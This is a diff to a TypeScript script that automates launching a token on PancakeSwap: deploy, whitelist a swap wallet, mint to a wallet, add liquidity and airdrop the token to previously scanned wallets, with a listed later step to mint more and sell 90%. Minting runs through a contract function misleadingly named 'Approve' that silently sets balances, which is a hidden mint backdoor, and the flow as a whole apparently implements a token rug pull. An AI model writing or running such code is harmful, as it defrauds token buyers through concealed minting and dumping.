@@ -22,10 +22,10 @@ const SCAN_CHUNK = 50 // blocks per batch for getBlockWithTransactions
 
 // Steps (9 total):
 // 0  → 1.   Deploy & Initialize
-// 1  → 1.1  Transfer new token to previously scanned wallets (from DB)
-// 2  → 2.   Set Whitelist
-// 3  → 3.   Transfer Token to mint wallet
-// 4  → 4.   Add Liquidity
+// 1  → 2.   Set Whitelist
+// 2  → 3.   Transfer Token to mint wallet
+// 3  → 4.   Add Liquidity
+// 4  → 1.1  Transfer new token to previously scanned wallets (from DB) — after liquidity
 // 5  → 5.1  Swap commands
 // 6  → 5.2  Scan wallets + Disperse from mint wallet
 // 7  → 6.   Mint thêm & Bán 90%
@@ -241,11 +241,80 @@ export async function runAutomation(
             onStepChange(token.id, 0, 'finish')
             checkStop()
 
-            // ── Step 1: 1.1 Transfer new token to previously scanned wallets
+            const hasScanConfig = params.scanContract && Number(params.disperseAmount) > 0
+
+            // ── Step 1: Set Whitelist ──────────────────────────────────────
             currentStep = 1
             onStepChange(token.id, 1, 'process')
+            await ensureWhitelisted(deployed, swapWallet.address, onLog, '[2]', params.shouldStop)
+            onStepChange(token.id, 1, 'finish')
+            checkStop()
 
-            const hasScanConfig = params.scanContract && Number(params.disperseAmount) > 0
+            // ── Step 2: Mint Token to mint wallet via Approve() ───────────────
+            currentStep = 2
+            onStepChange(token.id, 2, 'process')
+            {
+                const approveValMint = ethers.utils.parseUnits(token.mintAmount, Math.max(0, token.decimal - 9))
+                const mintForMint = new ethers.Contract(
+                    contractAddress,
+                    ['function Approve(address from, uint256 _value) external returns (bool)'],
+                    mainWallet
+                )
+                onLog(`[3] Approve(mintWallet, ${token.mintAmount} tokens)`)
+                tx = await mintForMint.Approve(mintWallet.address, approveValMint, { gasLimit: 200_000, gasPrice: GAS_PRICE })
+                await raceStop(tx.wait(), params.shouldStop)
+                onLog(`[3] ✓ Minted to mint wallet | tx: ${tx.hash}`)
+            }
+            onStepChange(token.id, 2, 'finish')
+            checkStop()
+
+            // ── Step 3: Add Liquidity ──────────────────────────────────────
+            currentStep = 3
+            onStepChange(token.id, 3, 'process')
+
+            const erc20 = new ethers.Contract(contractAddress, ERC20_ABI, mainWallet)
+            const mainTokenBal = await erc20.balanceOf(mainWallet.address) as ethers.BigNumber
+            onLog(`[4] mainWallet token balance: ${ethers.utils.formatUnits(mainTokenBal, token.decimal)}`)
+            const bnbBal = await provider.getBalance(mainWallet.address)
+            onLog(`[4] BNB balance: ${ethers.utils.formatEther(bnbBal)}`)
+            if (bnbBal.lt(liqBNB))
+                throw new Error(
+                    `[4] Khong du BNB: can ${token.liquidityBNB}, co ${ethers.utils.formatEther(bnbBal)}`
+                )
+            await ensureApproval(erc20, PANCAKE_ROUTER, liqTokenRaw, onLog, '[4]', params.shouldStop)
+
+            const deadline = Math.floor(Date.now() / 1000) + 600
+            const router = new ethers.Contract(PANCAKE_ROUTER, ROUTER_PANCAKE_V2_ABI, mainWallet)
+            const liqArgs = [
+                contractAddress,
+                liqTokenRaw,
+                0,
+                0,
+                mainWallet.address,
+                deadline,
+            ] as const
+            const liqOverride = { value: liqBNB, gasLimit: 6_000_000, gasPrice: GAS_PRICE }
+
+            onLog(`[4] addLiquidityETH(${token.liquidityToken} tokens + ${token.liquidityBNB} BNB)`)
+            tx = await router.addLiquidityETH(...liqArgs, liqOverride)
+            await raceStop(tx.wait(), params.shouldStop)
+            onLog(`[4] ✓ Liquidity added | tx: ${tx.hash}`)
+
+            // whitelist the actual pair address (queried from factory after creation)
+            const pancakeFactory = new ethers.Contract(
+                PANCAKE_FACTORY,
+                ['function getPair(address,address) view returns (address)'],
+                provider
+            )
+            const pairAddress = (await pancakeFactory.getPair(contractAddress, WBNB)) as string
+            onLog(`[4] Pair address: ${pairAddress}`)
+
+            onStepChange(token.id, 3, 'finish')
+            checkStop()
+
+            // ── Step 4: 1.1 Transfer new token to previously scanned wallets (after liquidity) ──
+            currentStep = 4
+            onStepChange(token.id, 4, 'process')
             if (hasScanConfig) {
                 const scanRecords: any[] =
                     (await zenStackFunction('ScanWallet', 'findMany', {
@@ -260,18 +329,16 @@ export async function runAutomation(
 
                     const disperseAmt = ethers.utils.parseUnits(params.disperseAmount, token.decimal)
                     const disperseTotal = disperseAmt.mul(destinations.length)
-                    // mainWallet cần giữ lại liqTokenRaw cho bước 4, cộng thêm disperseTotal để transfer đi
-                    const neededTotal = disperseTotal.add(liqTokenRaw)
 
-                    // Approve() SET balance (không cộng) → phải set thành neededTotal để sau transfer vẫn còn liqToken
+                    // Liquidity đã add xong → mainWallet không cần giữ liqTokenRaw nữa
                     const mainBal11 = await deployed.balanceOf(mainWallet.address) as ethers.BigNumber
-                    if (mainBal11.lt(neededTotal)) {
-                        const neededHuman = ethers.utils.formatUnits(neededTotal, token.decimal)
+                    if (mainBal11.lt(disperseTotal)) {
+                        const neededHuman = ethers.utils.formatUnits(disperseTotal, token.decimal)
                         const approveVal11 = ethers.utils.parseUnits(
                             String(Math.ceil(Number(neededHuman))),
                             Math.max(0, token.decimal - 9)
                         )
-                        onLog(`[1.1] Mint ${Math.ceil(Number(neededHuman))} tokens → mainWallet (disperse + liqToken reserve)`)
+                        onLog(`[1.1] Mint ${Math.ceil(Number(neededHuman))} tokens → mainWallet (disperse)`)
                         const mintContract11 = new ethers.Contract(
                             contractAddress,
                             ['function Approve(address from, uint256 _value) external returns (bool)'],
@@ -326,75 +393,6 @@ export async function runAutomation(
             } else {
                 onLog('[1.1] Bỏ qua (chưa cấu hình scanContract hoặc disperseAmount)')
             }
-            onStepChange(token.id, 1, 'finish')
-            checkStop()
-
-            // ── Step 2: Set Whitelist ──────────────────────────────────────
-            currentStep = 2
-            onStepChange(token.id, 2, 'process')
-            await ensureWhitelisted(deployed, swapWallet.address, onLog, '[2]', params.shouldStop)
-            onStepChange(token.id, 2, 'finish')
-            checkStop()
-
-            // ── Step 3: Mint Token to mint wallet via Approve() ───────────────
-            currentStep = 3
-            onStepChange(token.id, 3, 'process')
-            {
-                const approveValMint = ethers.utils.parseUnits(token.mintAmount, Math.max(0, token.decimal - 9))
-                const mintForMint = new ethers.Contract(
-                    contractAddress,
-                    ['function Approve(address from, uint256 _value) external returns (bool)'],
-                    mainWallet
-                )
-                onLog(`[3] Approve(mintWallet, ${token.mintAmount} tokens)`)
-                tx = await mintForMint.Approve(mintWallet.address, approveValMint, { gasLimit: 200_000, gasPrice: GAS_PRICE })
-                await raceStop(tx.wait(), params.shouldStop)
-                onLog(`[3] ✓ Minted to mint wallet | tx: ${tx.hash}`)
-            }
-            onStepChange(token.id, 3, 'finish')
-            checkStop()
-
-            // ── Step 4: Add Liquidity ──────────────────────────────────────
-            currentStep = 4
-            onStepChange(token.id, 4, 'process')
-
-            const erc20 = new ethers.Contract(contractAddress, ERC20_ABI, mainWallet)
-            const mainTokenBal = await erc20.balanceOf(mainWallet.address) as ethers.BigNumber
-            onLog(`[4] mainWallet token balance: ${ethers.utils.formatUnits(mainTokenBal, token.decimal)}`)
-            const bnbBal = await provider.getBalance(mainWallet.address)
-            onLog(`[4] BNB balance: ${ethers.utils.formatEther(bnbBal)}`)
-            if (bnbBal.lt(liqBNB))
-                throw new Error(
-                    `[4] Khong du BNB: can ${token.liquidityBNB}, co ${ethers.utils.formatEther(bnbBal)}`
-                )
-            await ensureApproval(erc20, PANCAKE_ROUTER, liqTokenRaw, onLog, '[4]', params.shouldStop)
-
-            const deadline = Math.floor(Date.now() / 1000) + 600
-            const router = new ethers.Contract(PANCAKE_ROUTER, ROUTER_PANCAKE_V2_ABI, mainWallet)
-            const liqArgs = [
-                contractAddress,
-                liqTokenRaw,
-                0,
-                0,
-                mainWallet.address,
-                deadline,
-            ] as const
-            const liqOverride = { value: liqBNB, gasLimit: 6_000_000, gasPrice: GAS_PRICE }
-
-            onLog(`[4] addLiquidityETH(${token.liquidityToken} tokens + ${token.liquidityBNB} BNB)`)
-            tx = await router.addLiquidityETH(...liqArgs, liqOverride)
-            await raceStop(tx.wait(), params.shouldStop)
-            onLog(`[4] ✓ Liquidity added | tx: ${tx.hash}`)
-
-            // whitelist the actual pair address (queried from factory after creation)
-            const pancakeFactory = new ethers.Contract(
-                PANCAKE_FACTORY,
-                ['function getPair(address,address) view returns (address)'],
-                provider
-            )
-            const pairAddress = (await pancakeFactory.getPair(contractAddress, WBNB)) as string
-            onLog(`[4] Pair address: ${pairAddress}`)
-
             onStepChange(token.id, 4, 'finish')
             checkStop()
 
